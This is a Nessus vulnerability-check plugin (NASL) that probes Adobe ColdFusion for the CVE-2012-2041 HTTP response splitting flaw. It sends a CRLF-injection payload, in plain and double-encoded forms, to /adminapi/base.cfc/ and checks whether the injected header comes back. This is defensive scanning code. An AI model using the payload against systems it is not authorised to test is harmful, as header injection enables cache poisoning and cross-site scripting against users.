#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(59715);
  script_version("$Revision: 1.14 $");
  script_cvs_date("$Date: 2015/10/29 18:09:14 $");

  script_cve_id("CVE-2012-2041");
  script_bugtraq_id(53941);
  script_osvdb_id(82847);

  script_name(english:"Adobe ColdFusion HTTP Response Splitting (APSB12-15)");
  script_summary(english:"Attempts to inject an HTTP header into server response.");

  script_set_attribute(attribute:"synopsis", value:
"An application hosted on the remote web server is affected by an HTTP
response splitting vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Adobe ColdFusion running on the remote host is affected
by an HTTP response splitting vulnerability.

The coldfusion.filter.ComponentFilter class does not properly sanitize
input used in the Location header of an HTTP response. A remote
attacker can exploit this by tricking a user into making a malicious
request, resulting in the injection of HTTP headers, modification of
the HTTP response body, or splitting the HTTP response into multiple
responses.");
  script_set_attribute(attribute:"see_also", value:"http://www.adobe.com/support/security/bulletins/apsb12-15.html");
  # http://helpx.adobe.com/coldfusion/kb/coldfusion-security-hotfix-apsb12-15.html
  script_set_attribute(attribute:"see_also",value:"http://www.nessus.org/u?8955b553");
  script_set_attribute(attribute:"solution", value:"Apply the hotfixes referenced in Adobe advisory APSB12-15.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/06/12");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/06/12");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/06/26");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:adobe:coldfusion");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2015 Tenable Network Security, Inc.");

  script_dependencies("coldfusion_detect.nasl");
  script_require_ports("Services/www", 80, 8500);
  script_require_keys("installed_sw/ColdFusion");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = 'ColdFusion';
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
ver = install['version'];
install_url = build_url(port:port, qs:dir);

vuln = FALSE;
report2 = '';

header_name = 'X-' + str_replace(string:SCRIPT_NAME, find:'.', replace:'-');
time = unixtime();

install_url = build_url(qs:dir, port:port);

payload = '%0d%0a' + header_name + ':%20' + time;
url = dir + '/adminapi/base.cfc/' + payload;

res = http_send_recv3(method:'GET', item:url, port:port, exit_on_fail:TRUE);
headers = parse_http_headers(status_line:res[0], headers:res[1]);
if (isnull(headers)) audit(AUDIT_WEB_NO_SERVER_HEADER, port);

header_val = headers[tolower(header_name)];

if (header_val == time)
{
  vuln = TRUE;
  report2 = '\n' + 'This produced the following response : \n\n';
}

if (!vuln)
{
  # Check for patch which strips '%0d%0a' and ensure to only check affected
  # versions of CF unless paranoid
  if (
    ver =~ "^[8|9]\." ||
    (report_paranoia == 2 && ver == UNKNOWN_VER)
  )
  {
    payload = '%250d%250a' + header_name + ':' + time;
    url = '/adminapi/base.cfc/' + payload;
    expected_response = str_replace(string:url, find:'%25', replace:'%');

    res = http_send_recv3(method:'GET', item:dir+url, port:port, exit_on_fail:TRUE);

    headers = parse_http_headers(status_line:res[0], headers:res[1]);
    if (isnull(headers)) audit(AUDIT_WEB_NO_SERVER_HEADER, port);

    # Extract the HTTP header we attempted to inject
    location = headers['location'];
    if (expected_response >< location)
    {
      vuln = TRUE;
      report2 =
       '\n' + 'URL encoded CRLF characters were not stripped from the Location header' +
       '\n' + 'of the server response :\n\n';
    }
  }
}

if (!vuln) audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);

set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
if (report_verbosity > 0)
{
  report =
    '\n' + 'Nessus verified the vulnerability by requesting the URL :\n\n' +
    install_url + url +'\n' +
    report2 +
    res[0] + res[1];
  security_warning(port:port, extra:report);
}
else security_warning(port);

